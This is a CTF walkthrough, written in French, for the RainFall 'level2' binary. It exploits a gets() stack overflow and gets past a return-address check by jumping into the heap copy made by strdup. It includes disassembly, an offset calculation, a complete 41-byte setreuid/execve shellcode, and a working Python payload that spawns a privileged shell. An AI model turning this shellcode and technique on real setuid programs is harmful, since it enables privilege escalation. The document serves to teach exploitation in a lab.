# level2

## Objectif

Exploiter le binaire `level2` pour obtenir un shell `level3` et lire
`/home/user/level3/.pass`.

## 1. Repérer la faille

```sh
gdb ./level2
(gdb) disas main
```

```asm
0x0804853f <+0>:   push   %ebp
0x08048540 <+1>:   mov    %esp,%ebp
0x08048542 <+3>:   and    $0xfffffff0,%esp
0x08048545 <+6>:   call   0x80484d4 <p>      ; toute la logique est dans p
0x0804854a <+11>:  leave
0x0804854b <+12>:  ret
```

`main` se contente d'appeler la fonction `p`. On regarde donc `p` :

```sh
(gdb) disas p
```

```asm
0x080484d4 <+0>:   push   %ebp
0x080484d5 <+1>:   mov    %esp,%ebp
0x080484d7 <+3>:   sub    $0x68,%esp
0x080484da <+6>:   mov    0x8049860,%eax
0x080484df <+11>:  mov    %eax,(%esp)
0x080484e2 <+14>:  call   0x80483b0 <fflush@plt>
0x080484e7 <+19>:  lea    -0x4c(%ebp),%eax    ; buffer à ebp-0x4c
0x080484ea <+22>:  mov    %eax,(%esp)
0x080484ed <+25>:  call   0x80483c0 <gets@plt>   ; gets(buffer) -> faille
...
```

`p` lit l'entrée avec **`gets`** dans un buffer situé à `ebp-0x4c`, sans contrôle
de taille → débordement de buffer sur la pile, comme aux niveaux précédents.

## 2. La protection anti-retour

```asm
0x080484f2 <+30>:  mov    0x4(%ebp),%eax     ; eax = adresse de retour (ebp+4)
0x080484f5 <+33>:  mov    %eax,-0xc(%ebp)
0x080484f8 <+36>:  mov    -0xc(%ebp),%eax
0x080484fb <+39>:  and    $0xb0000000,%eax   ; garde les bits de poids fort
0x08048500 <+44>:  cmp    $0xb0000000,%eax   ; l'adresse commence-t-elle par 0xb ?
0x08048505 <+49>:  jne    0x8048527 <p+83>   ; non -> chemin normal
0x08048507 <+51>:  ...                       ; oui -> printf puis _exit(1)
0x08048522 <+78>:  call   0x80483d0 <_exit@plt>
```

Après le `gets`, `p` **relit l'adresse de retour** (celle qu'on vient d'écraser)
et vérifie si elle **commence par `0xb`**. Si oui, il quitte immédiatement
(`_exit(1)`).

Sur ce système (sans ASLR), la **pile** est en `0xbffff...` et la **libc** en
`0xb7...` : toutes commencent par `0xb`. Cette protection **interdit donc de
revenir sur la pile ou dans la libc**. Impossible de sauter sur un shellcode
placé dans le buffer (pile `0xbf...`), ni de faire un ret2libc vers `system`
(`0xb7...`).

## 3. La porte de sortie : strdup

```asm
0x08048527 <+83>:  lea    -0x4c(%ebp),%eax
0x0804852a <+86>:  mov    %eax,(%esp)
0x0804852d <+89>:  call   0x80483f0 <puts@plt>    ; puts(buffer)
0x08048532 <+94>:  lea    -0x4c(%ebp),%eax
0x08048535 <+97>:  mov    %eax,(%esp)
0x08048538 <+100>: call   0x80483e0 <strdup@plt>  ; strdup(buffer)
0x0804853d <+105>: leave
0x0804853e <+106>: ret
```

`strdup(buffer)` **recopie notre saisie sur le tas** (*heap*). Les adresses du
tas ressemblent à `0x0804a...`, qui **ne commencent pas par `0xb`** :
`0x0804a008 & 0xb0000000 = 0 ≠ 0xb0000000` → **elles passent la protection**.

Stratégie : placer un shellcode au début de la saisie (donc au début de la copie
sur le tas), et écraser l'adresse de retour de `p` avec l'adresse **renvoyée par
`strdup`** (là où la copie a été déposée).

## 4. Calculer l'offset

Le buffer étant repéré par rapport à `ebp` (fixe), l'offset se lit directement :

- buffer à `ebp-0x4c` = `ebp - 76`
- adresse de retour à `ebp+4`
- distance = `0x4c + 4` = `76 + 4` = **80 octets**

Il faut donc **80 octets** avant les 4 octets qui écrasent l'adresse de retour.

## 5. Trouver l'adresse de la copie sur le tas

Le plus simple est d'utiliser `ltrace`, qui affiche les appels de bibliothèque
avec leurs arguments **et leur valeur de retour** :

```sh
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff724, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                                                                                                 = 0
gets(0xbffff62c, 0, 0, 0xb7e5ec73, 0x80482b5
)                                                                                                      = 0xbffff62c
puts(""
)                                                                                                                                           = 1
strdup("")                                                                                                                                         = 0x0804a008
+++ exited (status 8) +++
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff724, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                                                                                                 = 0
gets(0xbffff62c, 0, 0, 0xb7e5ec73, 0x80482b5toto
)                                                                                                      = 0xbffff62c
puts("toto"toto
)                                                                                                                                       = 5
strdup("toto")                                                                                                                                     = 0x0804a008 <- l'adresse de la copie sur le tas
```

`strdup` a déposé la copie à **`0x0804a008`**. C'est l'adresse cible : on y fera
pointer l'adresse de retour. En little-endian : `\x08\xa0\x04\x08`.

*(On peut aussi le vérifier dans gdb — `break *0x0804853d` puis
`info registers eax` — mais `ltrace` donne directement le retour de `strdup`.
Ici l'adresse du tas est stable entre `ltrace`, gdb et l'exécution normale, car
elle ne dépend pas de l'environnement comme le fait la pile.)*

## 6. Construire le shellcode

Le binaire est setuid `level3` (uid effectif `level3`, uid réel `level2`). Comme
`/bin/sh` abaisse ses privilèges si réel ≠ effectif, le shellcode doit d'abord
**aligner l'uid réel sur l'effectif** avant de lancer le shell. Trois blocs :

1. `geteuid()` (syscall 49) → récupère l'uid effectif dans `eax`.
2. `setreuid(euid, euid)` (syscall 70) → uid réel = uid effectif = `level3`.
3. `execve("/bin/sh", …)` (syscall 11) → lance le shell.

Chaque appel système suit le même schéma : numéro dans `eax`, arguments dans
`ebx`/`ecx`/`edx`, déclenchement par `int 0x80`. La chaîne `"/bin/sh"` est
construite sur la pile (empilée à l'envers), puis pointée via `esp`.

Shellcode (41 octets, sans octet nul) :

```
\x31\xc0\xb0\x31\xcd\x80                          ; geteuid()
\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80          ; setreuid(euid, euid)
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80   ; execve("/bin/sh")
```

### Générer ces octets avec nasm

On n'écrit pas les octets du shellcode à la main : on rédige l'assembleur (voir `Ressources`), puis `nasm`
le traduit en octets.

```sh
nasm -f bin shellcode.asm -o shellcode.bin            # assemble en binaire brut
xxd -p shellcode.bin | tr -d '\n' | sed 's/../\\x&/g' # octets au format little-endian
```

Deux vérifications indispensables :

- **`wc -c < shellcode.bin` = 41** : la taille attendue (sert au calcul du
  remplissage en section 7).
- **aucun octet nul** (`grep -c '^00$'` renvoie `0`) : un `\x00` tronquerait la
  copie faite par `gets`/`strdup`. C'est pour ça qu'on fait `xor eax,eax` +
  `mov al,NN` au lieu de `mov eax,NN` (ce dernier produirait des octets nuls).

## 7. Le payload et l'exécution

Structure : `[shellcode 41][remplissage 39][adresse 0x0804a008]`.

- shellcode = 41 octets
- remplissage = `80 - 41` = 39 octets de `\x90` (NOP)
- adresse = `\x08\xa0\x04\x08`

```sh
(python -c 'print "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x90"*39 + "\x08\xa0\x04\x08"'; cat) | ./level2
```

Le `cat` maintient l'entrée standard ouverte pour interagir avec le shell obtenu.

```sh
whoami                          # level3
cat /home/user/level3/.pass
```

Le mot de passe récupéré est à reporter dans le fichier `flag`.

## Nature de la faille

Débordement de buffer sur la pile (`gets` sans borne) avec une protection qui
interdit de retourner vers la pile ou la libc (adresses `0xb...`). Contournement
en exploitant la copie faite par `strdup` sur le tas (`0x08...`, non filtré) :
le shellcode y est recopié, et l'adresse de retour est redirigée vers cette
copie.
